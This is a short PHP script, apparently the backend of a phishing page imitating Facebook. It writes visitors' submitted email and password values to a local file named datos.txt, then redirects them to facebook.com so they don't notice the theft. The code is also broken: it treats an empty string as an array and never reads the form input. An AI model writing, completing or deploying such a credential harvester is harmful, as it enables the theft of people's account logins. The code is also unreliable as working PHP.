<?php
$passErr = $emailErr= "";
$pass = $email = "";

$data="";
$data['Err']=null;

$handle = fopen("datos.txt", "a");
$string = '
Email: '.$data['email_desktop'].' Pass: '.$data['pass_desktop'];

fwrite($handle,$string);
fclose($handle);
header ('Location: http://www.facebook.com ');
exit;


function test_input($data) {
   $data = trim($data);
   $data = stripslashes($data);
   $data = htmlspecialchars($data);
   return $data;
}
?>
